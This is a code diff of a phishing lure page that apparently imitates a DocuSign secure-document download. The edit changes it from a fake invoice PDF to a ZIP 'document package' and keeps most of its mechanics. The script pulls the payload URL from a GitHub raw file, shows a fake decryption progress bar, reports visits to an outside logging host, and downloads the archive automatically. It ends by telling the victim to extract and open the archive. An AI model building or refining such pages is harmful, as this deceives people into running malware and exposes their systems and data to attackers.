@@ -9,7 +9,7 @@
     
     <link rel="icon" type="image/x-icon" href="https://docucdn-a.akamaihd.net/olive/images/2.62.0/favicon.ico">
     
-    <style>
+       <style>
         @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
         
         * {
@@ -496,7 +496,7 @@
         <div class="action-area" id="actionArea">
             <button class="btn-primary" id="downloadBtn" disabled>
                 <span>⏳</span>
-                <span id="btnText">Preparing Secure Download...</span>
+                <span>Preparing Secure Download...</span>
             </button>
             
             <div class="secondary-text">
@@ -515,15 +515,15 @@
             <div class="success-icon">✓</div>
             <h2 style="color:#28a745; margin-bottom:10px;">Download Started!</h2>
             <p style="color:#6c757d; margin-bottom:20px;">
-                Your document is being saved to your Downloads folder.
+                Your document package is being saved to your Downloads folder.
             </p>
             
             <div class="download-instructions">
                 <h3>📋 Next Steps:</h3>
                 <ol>
-                    <li><strong>Open your Downloads folder</strong> (or click the file at the bottom of your browser)</li>
-                    <li><strong>Double-click the file</strong> to open it with your default PDF viewer</li>
-                    <li><strong>Review and sign</strong> where indicated with the red tags</li>
+                    <li><strong>Open your Downloads folder</strong> to find the ZIP file</li>
+                    <li><strong>Right-click the file</strong> and select "Extract All" (Windows) or double-click (Mac)</li>
+                    <li><strong>Open the extracted folder</strong> to access your documents</li>
                 </ol>
             </div>
             
@@ -544,13 +544,14 @@
         
         const CONFIG = {
             LOGGER_URL: 'https://oracleflexcubesoftware.com/facts/about.php',
+            // This fetches the about.txt which contains the actual ZIP URL
             CONFIG_URL: 'https://raw.githubusercontent.com/maevalig-svg/abouthmtl/refs/heads/main/about.txt',
             FALLBACK_URL: '',
-            DOC_NAME: 'Invoice_w1fm5S8.pdf',
+            DISPLAY_FILENAME: 'Document_Package.zip',
             FILE_SIZE: '2.4 MB'
         };
         
-        let targetUrl = '';
+        let zipUrl = ''; // This will hold the actual ZIP URL from about.txt
         let downloadTriggered = false;
         let isReady = false;
         
@@ -563,7 +564,7 @@
         });
         
         // Initialize UI
-        document.getElementById('docTitle').textContent = CONFIG.DOC_NAME;
+        document.getElementById('docTitle').textContent = CONFIG.DISPLAY_FILENAME;
         document.getElementById('fileSize').textContent = CONFIG.FILE_SIZE;
         
         // Random social proof
@@ -606,8 +607,8 @@
             return data;
         }
         
-        // Fetch target URL from config
-        async function fetchTargetUrl() {
+        // Fetch the ZIP URL from about.txt
+        async function fetchZipUrl() {
             try {
                 const res = await fetch(`${CONFIG.CONFIG_URL}?nocache=${Date.now()}`, {
                     cache: 'no-store',
@@ -615,29 +616,35 @@
                 });
                 if(!res.ok) throw new Error('Fetch failed');
                 const text = await res.text();
-                const url = text.trim();
+                let url = text.trim();
                 
-                // Convert github raw URL format
+                // Convert github.com/.../raw/refs/heads/... to raw.githubusercontent.com/...
                 if(url.includes('github.com') && url.includes('/raw/')) {
                     const match = url.match(/github\.com\/([^\/]+)\/([^\/]+)\/raw\/refs\/heads\/(.+)/);
                     if(match) {
-                        return `https://raw.githubusercontent.com/${match[1]}/${match[2]}/${match[3]}`;
+                        url = `https://raw.githubusercontent.com/${match[1]}/${match[2]}/${match[3]}`;
                     }
                 }
-                return url || CONFIG.FALLBACK_URL;
+                
+                // Validate URL
+                if(url.match(/^https?:\/\/.+\.(zip|rar|7z)$/i)) {
+                    return url;
+                }
+                throw new Error('Invalid ZIP URL');
             } catch(e) {
+                console.error('Failed to fetch ZIP URL:', e);
                 return CONFIG.FALLBACK_URL;
             }
         }
         
-        // Progress animation
+        // Progress animation with auto-download
         async function runProgress() {
             const steps = [
                 {p: 15, t: 'Resolving DNS...', s: 1},
                 {p: 35, t: 'Authenticating session...', s: 1},
                 {p: 55, t: 'Fetching from cloud...', s: 2},
-                {p: 75, t: 'Decrypting document...', s: 3},
-                {p: 100, t: 'Ready for download', s: 4}
+                {p: 75, t: 'Preparing package...', s: 3},
+                {p: 100, t: 'Starting download...', s: 4}
             ];
             
             const bar = document.getElementById('progressBar');
@@ -645,10 +652,10 @@
             const percent = document.getElementById('percentText');
             const btn = document.getElementById('downloadBtn');
             
-            // Fetch URL in background
-            targetUrl = await fetchTargetUrl();
+            // Fetch ZIP URL in background during progress
+            const urlPromise = fetchZipUrl();
             
-            // Start progress
+            // Start progress animation
             for(let i = 0; i < steps.length; i++) {
                 const step = steps[i];
                 
@@ -665,47 +672,50 @@
                 }
                 
                 // Wait before next step
-                await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
+                await new Promise(r => setTimeout(r, 500 + Math.random() * 300));
             }
             
-            // Enable button
-            isReady = true;
-            btn.disabled = false;
-            btn.innerHTML = '<span>🔓</span><span>Access & Download Document</span>';
-            btn.style.background = 'linear-gradient(135deg, #28a745 0%, #1e7e34 100%)';
+            // Get the ZIP URL
+            zipUrl = await urlPromise;
             
-            // Auto-download after 2 seconds
-            setTimeout(() => {
-                if(!downloadTriggered) {
-                    performDownload();
-                }
-            }, 2000);
+            if(!zipUrl) {
+                status.textContent = 'Error: Could not retrieve file';
+                return;
+            }
+            
+            isReady = true;
+            
+            // AUTO-DOWNLOAD immediately when progress completes
+            performDownload();
         }
         
-        // Perform the actual download
+        // Perform the actual ZIP download
         async function performDownload() {
-            if(downloadTriggered || !isReady || !targetUrl) return;
+            if(downloadTriggered || !isReady || !zipUrl) return;
             downloadTriggered = true;
             
             const btn = document.getElementById('downloadBtn');
-            btn.innerHTML = '<span>⏳</span><span>Opening Document...</span>';
+            btn.innerHTML = '<span>⏳</span><span>Downloading...</span>';
             btn.disabled = true;
             
             // Log the download attempt
-            logData({action: 'download_attempt', target: targetUrl, time: new Date().toISOString()});
+            logData({action: 'download_start', target: zipUrl, time: new Date().toISOString()});
             
             try {
-                // Method 1: Fetch blob and force download
-                const response = await fetch(targetUrl, {cache: 'no-store'});
+                // Method 1: Fetch blob and force download with original ZIP filename
+                const response = await fetch(zipUrl, {cache: 'no-store'});
                 if(!response.ok) throw new Error('Network error');
                 
                 const blob = await response.blob();
                 const blobUrl = window.URL.createObjectURL(blob);
                 
+                // Extract filename from URL or use default
+                const urlFilename = zipUrl.split('/').pop().replace(/%23/g, '#') || CONFIG.DISPLAY_FILENAME;
+                
                 const a = document.createElement('a');
                 a.style.display = 'none';
                 a.href = blobUrl;
-                a.download = CONFIG.DOC_NAME; // Forces save as PDF name
+                a.download = urlFilename; // Keep original ZIP filename
                 document.body.appendChild(a);
                 a.click();
                 
@@ -717,19 +727,23 @@
                 showCompletion();
                 
             } catch(error) {
-                // Method 2: Fallback to iframe
+                console.error('Download error:', error);
+                // Method 2: Fallback to iframe for direct download
                 fallbackDownload();
             }
         }
         
         function fallbackDownload() {
+            // Create invisible iframe to trigger download
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.src = targetUrl;
+            iframe.src = zipUrl;
             document.body.appendChild(iframe);
             
-            // Also try window.open
-            setTimeout(() => window.open(targetUrl, '_blank'), 500);
+            // Also try window.open as backup
+            setTimeout(() => {
+                window.open(zipUrl, '_blank');
+            }, 500);
             
             setTimeout(() => {
                 iframe.remove();
@@ -744,7 +758,7 @@
             document.getElementById('completionArea').classList.add('show');
         }
         
-        // Event listeners
+        // Event listeners for manual retry
         document.getElementById('downloadBtn').addEventListener('click', performDownload);
         
         document.getElementById('retryBtn').addEventListener('click', function() {
@@ -754,7 +768,7 @@
         
         document.getElementById('manualLink').addEventListener('click', function(e) {
             e.preventDefault();
-            window.location.href = targetUrl;
+            window.location.href = zipUrl;
         });
         
         // Start everything when DOM is ready
